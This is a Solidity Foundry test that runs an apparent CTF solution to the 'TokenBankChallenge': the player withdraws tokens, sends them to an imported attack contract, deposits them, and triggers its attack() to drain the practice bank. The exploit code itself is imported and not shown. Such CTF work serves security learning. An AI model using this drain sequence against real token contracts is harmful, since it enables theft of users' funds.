// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {AttackTokenBankChallenge} from "../../src/miscellaneous/helpers/AttackTokenBankChallenge.sol";

interface ISimpleERC223Token {
    function transfer(
        address to,
        uint256 value
    ) external returns (bool success);
}

interface ITokenBankChallenge {
    function token() external view returns (ISimpleERC223Token);

    function balanceOf(address) external view returns (uint256);

    function isComplete() external view returns (bool);

    function withdraw(uint256 amount) external;
}

contract TestTokenBankChallenge is Test {
    ITokenBankChallenge challenge;
    AttackTokenBankChallenge attack;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.prank(deployer);
        address challengeAddress = deployCode(
            "TokenBankChallenge.sol:TokenBankChallenge",
            abi.encode(player)
        );
        challenge = ITokenBankChallenge(challengeAddress);
    }

    function test_Solution() external {
        console.log("Player balance: ", challenge.balanceOf(player));

        vm.startPrank(player);

        challenge.withdraw(500000 * 10 ** 18);

        attack = new AttackTokenBankChallenge(address(challenge));
        challenge.token().transfer(address(attack), 500000 * 10 ** 18);

        attack.deposit();

        attack.attack();

        vm.stopPrank();

        assert(challenge.isComplete());
    }
}
